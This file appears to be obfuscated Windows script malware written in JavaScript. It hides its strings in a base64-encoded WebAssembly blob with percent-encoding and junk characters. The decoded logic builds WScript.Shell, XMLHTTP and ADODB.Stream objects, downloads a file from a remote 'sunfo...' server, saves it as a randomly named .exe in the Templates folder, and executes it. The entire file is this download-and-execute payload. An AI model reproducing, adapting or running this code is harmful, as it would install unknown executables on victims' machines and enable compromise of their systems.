const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGroKAgAAzfwBBAQt/AEEeC38AQSgLfwBBLgt/AEE0C38AQcYAC38AQegAC38AQfQAC38AQaoBC38AQeoBC38AQaYCC38AQawCC38AQcwDC38AQfgDC38AQYoEC38AQYoFC38AQY4FC38AQZAFC38AQZoFC38AQdoFC38AQfAFC38AQb4GC38AQZIHC38AQdwHC38AQYYIC38AQawIC38AQb4IC38AQewIC38AQYAJC38AQYYLC38AQZILC38AQdoLC38AQeQLC38AQfILC38AQf4LC38AQZgMC38AQdwMC38AQfgMC38AQa4NC38AQagOC38AQa4OC38AQaAPC38AQYIQC38AQY4QC38AQaYRC38AQaoRC38AQawRC38AQbIRC38AQbgRC38AQbwRC38AQcwRCwfLg4CAADQGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHBWRhdGE4AwgFZGF0YTkDCQZkYXRhMTADCgZkYXRhMTEDCwZkYXRhMTIDDAZkYXRhMTMDDQZkYXRhMTQDDgZkYXRhMTUDDwZkYXRhMTYDEAZkYXRhMTcDEQZkYXRhMTgDEgZkYXRhMTkDEwZkYXRhMjADFAZkYXRhMjEDFQZkYXRhMjIDFgZkYXRhMjMDFwZkYXRhMjQDGAZkYXRhMjUDGQZkYXRhMjYDGgZkYXRhMjcDGwZkYXRhMjgDHAZkYXRhMjkDHQZkYXRhMzADHgZkYXRhMzEDHwZkYXRhMzIDIAZkYXRhMzMDIQZkYXRhMzQDIgZkYXRhMzUDIwZkYXRhMzYDJAZkYXRhMzcDJQZkYXRhMzgDJgZkYXRhMzkDJwZkYXRhNDADKAZkYXRhNDEDKQZkYXRhNDIDKgZkYXRhNDMDKwZkYXRhNDQDLAZkYXRhNDUDLQZkYXRhNDYDLgZkYXRhNDcDLwZkYXRhNDgDMAZkYXRhNDkDMQZkYXRhNTADMgu0k4CAADMAQQELG3NjUmlwVGlOZy5mSUxlc1lzVGVtb2JKZWN0AABBHgsJQyUzQSU1Q3cAAEEoCwRpTkQAAEEuCwRvV3MAAEE0CxFadlphclolMjBBSnZRWnVaAABBxgALIGhVanpUUFpjWmJaZVpNWnlaclptJTIwWiUzRCUyMG4AAEHoAAsKWmVad1olMjBBAABB9AALNWNadGladmVaWFpPYmpaZVpjWnRaKFolMjJac2hlWmxabC5aYVpQUFpsWmlDQVpUWmlPWk4AAEGqAQs+JTIyWilaJTNCJTIwdmFyWiUyMHZaaFpJWmJabmZVWkdGWmlaQVpyWGN4JTIwWiUzRFolMjBabmVadyUyMAAAQeoBCztBWmNadGladlplWlhPWmJaalplY1p0KFolMjJad3NaY1pyWmlacFp0LnNaaGVabFpsWiUyMlopJTNCAABBpgILBXZaYVoAAEGsAgufAXJaJTIwWlFablppWmdaR1plV1pUZnNaRFpxZGFaUnpaS1pNWkIlMjBaJTNEJTIwdmhJYm5aZlpVR1pGaUFaclpYY1p4Wi5aUlplZ1pSZWFkKFpZbXNaWFpMWnlhWkhTcUdaeFpVWldaUVpJWnZmWk9aLnJaZXBabFphY2UoJTJGQVpCQyUyRmclMkNaJTIwJTIyJTIyWilaKS5aY1poAABBzAMLKmFaclpBWnRaKDZaNDc2NjZaMjIlMkY2WjRaNzZaNlo2WjJaMlopJTNCAABB+AMLEEhLQUJDTE0lNUNTQUJDbwAAQYoEC39GdFdhcmUlNUNtSUNyb0FCQ1NBQkNvZnQlNUNXQUJDSUFCQ25kQUJDb0FCQ1dzQUJDJTIwQUJDTnQlNUNjQUJDVUFCQ1JSZUFCQ05BQkN0dmVBQkNyQUJDc0FCQ0lBQkNPbiU1Q3NBQkNZc0FCQ3RFQUJDbUFCQ3JvQUJDb1QAAEGKBQsCWgAAQY4FCwEAAEGQBQsJJTNGdmFsKHUAAEGaBQs/biUzRnNjYXAlM0YoJTIydmFyJTNBMjB3c2glM0EyMCUzQTNEJTNBMjBuJTNGdyUzQTIwQWN0aXYlM0ZYT2IAAEHaBQsVaiUzRmN0JTNBMjglM0EyMndzY3IAAEHwBQtMaXB0JTNBMkVzaCUzRmxsJTNBMjIlM0EyOSUzQTNCJTNBMEQlM0EwQXZhciUzQTIwc2glM0EyMCUzQTNEJTNBMjBuJTNGdyUzQTIwAABBvgYLUkFjdGl2JTNGWE9iaiUzRmN0JTNBMjglM0EyMnNoJTNGbGwlM0EyRWFwcGxpY2F0aW9uJTNBMjIlM0EyOSUzQTNCJTNBMEQlM0EwQXZhciUzQQAAQZIHC0gyMEhUVFAlM0EyMCUzQTNEJTNBMjBuJTNGdyUzQTIwQWN0aXYlM0ZYT2JqJTNGY3QlM0EyOCUzQTIyTVNYTUwlM0EzMiUzQQAAQdwHCykyRVhNTEhUVFAlM0EyMiUzQTI5JTNBM0IlM0EwRCUzQTBBdmFyJTNBAABBhggLJDIwU3RyJTNGYW0lM0EyMCUzQTNEJTNBMjBuJTNGdyUzQTIwAABBrAgLEUFjdGl2JTNGWE9iaiUzRmMAAEG+CAstdCUzQTI4JTNBMjJBRE9EQiUzQTJFU3RyJTNGYW0lM0EyMiUzQTI5JTNBM0IAAEHsCAsTJTNBMEQlM0EwQXZhciUzQTIwAABBgAkLhQJwYXRoJTNBMjAlM0EzRCUzQTIwd3NoJTNBMkVTcCUzRmNpYWxGb2xkJTNGcnMlM0EyOCUzQTIyVCUzRm1wbGF0JTNGcyUzQTIyJTNBMjklM0EyQiUzQTIyJTNBNUMlM0E1QyUzQTIyJTNBMkIlM0EyOCUzQTI4TWF0aCUzQTJFcmFuZG9tJTNBMjglM0EyOSUzQTJBJTNBMzklM0EzOSUzQTM5JTNBMzklM0EzOSUzQTM5JTNBMjklM0EyQiUzQTM5JTNBMzklM0EzOSUzQTM5JTNBN0MlM0EzMCUzQTI5JTNBMkIlM0EyMiUzQTJFJTNGeCUzRiUzQTIyJTNBM0IlM0EwRAAAQYYLCwolM0EwQUhUVFAAAEGSCwtHJTNBMkVPcCUzRm4lM0EyOCUzQTIyR0VUJTNBMjIlM0EyQyUzQTIwJTNBMjJodHRwJTNBM0ElM0EyRiUzQTJGc3VuZm9sbwAAQdoLCwhwYXMlM0EyAABB5AsLDEV0b3AlM0EyRmFkAABB8gsLCm1pbiUzQTJFcAAAQf4LCxhocCUzQTNGZiUzQTNEJTNBMzQlM0EzMAAAQZgMC0MlM0EzNCUzQTIyJTNBMkMlM0EyMGZhbHMlM0YlM0EyOSUzQTNCJTNBMjBIVFRQJTNBMkVTJTNGbmQlM0EyOCUzQTIAAEHcDAsbOSUzQTNCJTNBMjBpZiUzQTIwJTNBMjhIVFQAAEH4DAs1UCUzQTJFU3RhdHVzJTNBMjAlM0EzRCUzQTNEJTNBMjAlM0EzMiUzQTMwJTNBMzAlM0EyOQAAQa4NC3glM0EyMCUzQTdCJTNBMEQlM0EwQVN0ciUzRmFtJTNBMkVPcCUzRm4lM0EyOCUzQTI5JTNBM0IlM0EyMFN0ciUzRmFtJTNBMkVUeXAlM0YlM0EyMCUzQTNEJTNBMjAlM0EzMSUzQTNCJTNBMjBTdHIlM0ZhbSUzQQAAQagOCwQyRVcAAEGuDgtwcml0JTNGJTNBMjhIVFRQJTNBMkVSJTNGc3BvbnMlM0ZCb2R5JTNBMjklM0EzQiUzQTIwJTNBMEQlM0EwQVN0ciUzRmFtJTNBMkVQb3NpdGlvbiUzQTIwJTNBM0QlM0EyMCUzQTMwJTNBM0IlM0EyAABBoA8LYTBTdHIlM0ZhbSUzQTJFU2F2JTNGVG9GaWwlM0YlM0EyOHBhdGglM0EyQyUzQTIwJTNBMzIlM0EyOSUzQTNCJTNBMEQlM0EwQVN0ciUzRmFtJTNBMkVDbG9zJTNGJTNBMgAAQYIQCwo4JTNBMjklM0EAAEGOEAuXATNCJTNBMjBzaCUzQTJFU2glM0ZsbEV4JTNGY3V0JTNGJTNBMjhwYXRoJTNBMkMlM0EyMCUzQTIyJTNBMjIlM0EyQyUzQTIwJTNBMjIlM0EyMiUzQTJDJTNBMjAlM0EyMm9wJTNGbiUzQTIyJTNBMkMlM0EyMCUzQTMxJTNBMjklM0EzQiUzQTIwJTNBN0QlMjIpKSUzQgAAQaYRCwJaAABBqhELAQAAQawRCwQlMjUAAEGyEQsEJTNGAABBuBELAmUAAEG8EQsOQWN0aXZlWE9iamVjdAAAQcwRCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var bVEFGroSdekQBhmW = new window[(lS(0, 49, true))](lS(0, 0));
if (bVEFGroSdekQBhmW.FolderExists(lS(0, 1) + lS(0, 2) + lS(0, 3)) == true) {
    var YaxLoNnKuIVfrXdmwv = lS(0, 4) + lS(0, 5) + lS(0, 6) + lS(0, 7) + lS(0, 8) + lS(0, 9);
    var FcuwqBmyVCQRXTlveb = lS(0, 10) + lS(0, 11) + lS(0, 12);
    var YmsXLyaHSqGxUWQIvfO = lS(0, 13) + lS(0, 14);
    function UFyhbYPNaveSMtw(ILzUBJQyDlbRqikmN, sgHDGucvkJWAzMRXV, elgKOFHpjukCEhbzAI) {
        return ILzUBJQyDlbRqikmN.split(sgHDGucvkJWAzMRXV).join(elgKOFHpjukCEhbzAI);
    }
    var BWyDMfxbqRriwzIjOsQ = window[lS(0, 50, true)](UFyhbYPNaveSMtw(YaxLoNnKuIVfrXdmwv, lS(0, 15), lS(0, 16)));
    var RehasfVdmkIwyXWYrM = lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23) + lS(0, 24) + lS(0, 25) + lS(0, 26) + lS(0, 27) + lS(0, 28) + lS(0, 29) + lS(0, 30) + lS(0, 31) + lS(0, 32) + lS(0, 33) + lS(0, 34) + lS(0, 35) + lS(0, 36) + lS(0, 37) + lS(0, 38) + lS(0, 39) + lS(0, 40) + lS(0, 41) + lS(0, 42) + lS(0, 43);
    FcuwqBmyVCQRXTlveb = UFyhbYPNaveSMtw(FcuwqBmyVCQRXTlveb, lS(0, 44), lS(0, 45));
    var dRJpxutvKnQPDgECSj = window[lS(0, 50, true)](FcuwqBmyVCQRXTlveb);
    var sRmakANqntPCHzfweWM = window[lS(0, 50, true)](UFyhbYPNaveSMtw(UFyhbYPNaveSMtw(RehasfVdmkIwyXWYrM, QnigGeWTfsDqdaRzKMB, lS(0, 46)), lS(0, 47), lS(0, 48)));
}